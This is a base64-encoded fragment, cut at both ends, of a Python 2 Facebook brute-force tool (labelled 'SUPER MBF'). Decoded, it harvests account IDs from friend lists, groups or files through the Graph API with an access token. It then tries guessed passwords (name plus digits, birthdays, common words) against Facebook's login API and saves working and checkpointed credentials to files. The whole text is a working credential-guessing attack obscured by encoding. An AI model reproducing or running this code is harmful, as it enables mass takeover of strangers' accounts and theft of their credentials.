Jpc2EgPSBvcGVuKCJvdXQvbWJmX29rLnR4dCIsICJ3IikKCQkJCWJpc2Eud3JpdGUodXNlcm5hbWUrInwiK3Bhc3N3KyJcbiIpCgkJCQliaXNhLmNsb3NlKCkKCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcm5hbWUrIj9hY2Nlc3NfdG9rZW49IittcHNoWydhY2Nlc3NfdG9rZW4nXSkKCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCXN1Y2Vzc2Z1bC5hcHBlbmQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1PS+Kck1wwMzNbMTs5N20gXSAiK3VzZXJuYW1lKyJ8IiArcGFzc3crIiA9PiIrelsnbmFtZSddKQoJCQllbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWyJlcnJvcl9tc2ciXToKCQkJCWNoZWNrX2l0ID0gb3Blbigib3V0L21iZl9jcC50eHQiLCAidyIpCgkJCQljaGVja19pdC53cml0ZSh1c2VybmFtZSsifCIrcGFzc3crIlxuIikKCQkJCWNoZWNrX2l0LmNsb3NlKCkKCQkJCWNoZWNrcG9pbnQuYXBwZW5kKCJcMDMzWzE7OTdtWyBcMDMzWzE7OTNtQ1DinJpcMDMzWzE7OTdtIF0gIit1c2VybmFtZSsifCIgK3Bhc3N3KQoJCQllbHNlOgoJCQkJYWN0aW9uX2ZhaWxlZC5hcHBlbmQodXNlcm5hbWUpCgkJCQliYWNrICs9MQoJCQlzeXMuc3Rkb3V0LndyaXRlKCdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKcuFwwMzNbMTs5MW1dIFwwMzNbMTs5Mm1DcmFjayAgICBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJytzdHIoYmFjaykrJyBcMDMzWzE7OTZtPlwwMzNbMTs5N20gJytzdHIobGVuKHVwKSkrJyA9PlwwMzNbMTs5Mm1MaXZlXDAzM1sxOzkxbTpcMDMzWzE7OTZtJytzdHIobGVuKHN1Y2Vzc2Z1bCkpKycgXDAzM1sxOzk3bT0+XDAzM1sxOzkzbUNoZWNrXDAzM1sxOzkxbTpcMDMzWzE7OTZtJytzdHIobGVuKGNoZWNrcG9pbnQpKSk7c3lzLnN0ZG91dC5mbHVzaCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcblwwMzNbMTs5MW1bIV0gU2xlZXAiCgkJdGltZS5zbGVlcCgwLjAxKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoKZGVmIHN1Y2Nlc3MoKToKCXByaW50CglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCSMjI3N1Y2Vzc2Z1bAoJZm9yIGIgaW4gc3VjZXNzZnVsOgoJCXByaW50KGIpCgkjIyNDSEVDSwoJZm9yIGMgaW4gY2hlY2twb2ludDoKCQlwcmludChjKQoJIyMjYWN0aW9uX2ZhaWxlZAoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCAoIlwwMzNbMzFtW3hdIEZhaWxlZCBcMDMzWzE7OTdtLS0+ICIgKyBzdHIobGVuKGFjdGlvbl9mYWlsZWQpKSkKCWV4aXQoKQoKIyMjIyMjIyMjIyMjIyMjIFNVUEVSIE1CRiAjIyMjIyMjIyMjIyMjIyMjCmRlZiBzdXBlcigpOgoJZ2xvYmFsIGZiX3Rva2VuCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gQ3JhY2sgd2l0aCBsaXN0IGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIENyYWNrIGZyb20gZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gQ3JhY2sgZnJvbSBtZW1iZXIgZ3JvdXAiCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQ3JhY2sgZnJvbSBGaWxlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCgljaG9pY2VzX3N1cGVyKCkKCmRlZiBjaG9pY2VzX3N1cGVyKCk6CglwZWFrID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikKCWlmIHBlYWsgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9pY2VzX3N1cGVyKCkKCWVsaWYgcGVhayA9PSIxIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgXDAzM1sxOzk3bS4uLicpCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpCgkJZm9yIHMgaW4gelsnZGF0YSddOgoJCQlpZC5hcHBlbmQoc1snaWQnXSkKCWVsaWYgcGVhayA9PSIyIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBmcmllbmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCgkJdHJ5OgoJCQlzZWF0ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCQlvcCA9IGpzb24ubG9hZHMoc2VhdC50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCXN1cGVyKCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGlkIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpCgkJZm9yIGkgaW4gelsnZGF0YSddOgoJCQlpZC5hcHBlbmQoaVsnaWQnXSkKCWVsaWYgcGVhayA9PSIzIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludCBsb2dvCgkJaWRnPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgkJdHJ5OgoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWRnKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQlzdXBlcigpCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBpZCBcMDMzWzE7OTdtLi4uJykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWRnKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCXM9anNvbi5sb2FkcyhyZS50ZXh0KQoJCWZvciBwIGluIHNbJ2RhdGEnXToKCQkJaWQuYXBwZW5kKHBbJ2lkJ10pCiAgICAgICAgZWxpZiBwZWFrID09ICI0IjoKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICAgICAgcHJpbnQgbG9nbwogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZGxpc3QgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgSUQgIFwwMzNbMTs5MW06IFwwMzNbMTs5N20nKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwncicpLnJlYWRsaW5lcygpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCiAgICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kJwogICAgICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgICAgICBzdXBlcigpCgllbGlmIHBlYWsgPT0iMCI6CgkJbWVudV9oYWNrKCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJY2hvaWNlc19zdXBlcigpCgogICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGlkKSkKICAgICAgICBta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXRpbG9hZCA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10KCWZvciBvIGluIHRpbG9hZDoKCQlwcmludCgiXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgXDAzM1sxOzk3bSIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpCglwcmludAogICAgICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoKCgkjIyMjIyBjcmFjayAjIyMjIwoJZGVmIG1haW4oYXJnKToKCQlnbG9iYWwgY2hlY2twb2ludCxva3MKCQl1c2VyID0gYXJnCgkJdHJ5OgoJCQlvcy5ta2Rpcignb3V0JykKCQlleGNlcHQgT1NFcnJvcjoKCQkJcGFzcwoJCXRyeToKCQkJI1Bhc3MxCgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQkJYiA9IGpzb24ubG9hZHMoYS50ZXh0KQoJCQlwYXNzMSA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzJwoJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczErIiA9PiIrelsnbmFtZSddKQoJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQllbHNlOgoJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCWNoZWNrX2l0ID0gb3Blbigib3V0L291dHB1dC50eHQiLCAiYSIpCgkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczErIlxuIikKCQkJCQljaGVja19pdC5jbG9zZSgpCgkJCQkJY2hlY2twb2ludC5hcHBlbmQodXNlcitwYXNzMSkKCQkJCWVsc2U6CgkJCQkJI1Bhc3MyCgkJCQkJcGFzczIgPSBiWydmaXJzdF9uYW1lJ10rJzEyMzQ1JwoJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MyKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCgkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczIrIiA9PiIrelsnbmFtZSddKQoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczIpCgkJCQkJZWxzZToKCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJY2hlY2tfaXQgPSBvcGVuKCJvdXQvb3V0cHV0LnR4dCIsICJhIikKCQkJCQkJCWNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3MyKyJcbiIpCgkJCQkJCQljaGVja19pdC5jbG9zZSgpCgkJCQkJCQljaGVja3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MyKQoJCQkJCQllbHNlOgoJCQkJCQkJI1Bhc3MzCgkJCQkJCQlwYXNzMyA9IGJbJ2xhc3RfbmFtZSddICsgJzEyMycKCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MzKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCgkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3MzKyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczMpCgkJCQkJCQllbHNlOgoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJY2hlY2tfaXQgPSBvcGVuKCJvdXQvb3V0cHV0LnR4dCIsICJhIikKCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczMrIlxuIikKCQkJCQkJCQkJY2hlY2tfaXQuY2xvc2UoKQoJCQkJCQkJCQljaGVja3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQoJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCSNQYXNzNAoJCQkJCQkJCQltb2RlID0gYlsnYmlydGhkYXknXQoJCQkJCQkJCQlwYXNzNCA9IG1vZGUucmVwbGFjZSgnLycsICcnKQoJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczQrIiA9PiIrelsnbmFtZSddKQoJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M0KQoJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCWNoZWNrX2l0ID0gb3Blbigib3V0L291dHB1dC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczQrIlxuIikKCQkJCQkJCQkJCQljaGVja19pdC5jbG9zZSgpCgkJCQkJCQkJCQkJY2hlY2twb2ludC5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJI1Bhc3M1CgkJCQkJCQkJCQkJcGFzczUgPSAic2F5YW5nMTIzIiwic2F5YW5na3UxMjMiCgkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybeKck1wwMzNbMTs5N20gXSAiK3VzZXIrInwiICtwYXNzNSsiID0+Iit6WyduYW1lJ10pCgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNSkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczUrIlxuIikKCQkJCQkJCQkJCQkJCWNoZWNrX2l0LmNsb3NlKCkKCQkJCQkJCQkJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpCgkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkjUGFzczYKCQkJCQkJCQkJCQkJCXBhc3M2ID0gImJpbnRhbmcxMjMiLCJiaW50YW5nMTIzNDUiCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybeKck1wwMzNbMTs5N20gXSAiK3VzZXIrInwiICtwYXNzNisiID0+Iit6WyduYW1lJ10pCgkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M2KQoJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQkJCWNoZWNrX2l0ID0gb3Blbigib3V0L291dHB1dC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCWNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3M2KyJcbiIpCgkJCQkJCQkJCQkJCQkJCWNoZWNrX2l0LmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJY2hlY2twb2ludC5hcHBlbmQodXNlcitwYXNzNikKCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkjUGFzczcKCQkJCQkJCQkJCQkJCQkJYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyt1c2VyKycvP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCQkJCQkJCQkJCQkJCQliID0ganNvbi5sb2FkcyhhLnRleHQpCgkJCQkJCQkJCQkJCQkJCXBhc3M3ID0gIjEyMzQ1Njc4OTAiLCJwYXNzd29yZDEyMyIsIm1pY2hlbGxlIiwic29tZW9uZSIsIiIsImlsb3ZleW91IiwicHJpbmNlc3MiLCJwbGF5Ym95IgoJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczcrIiA9PiIrelsnbmFtZSddKQoJCQkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M3KQoJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQkJCQkJCWNoZWNrX2l0ID0gb3Blbigib3V0L291dHB1dC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczcrIlxuIikKCQkJCQkJCQkJCQkJCQkJCQljaGVja19pdC5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJY2hlY2twb2ludC5hc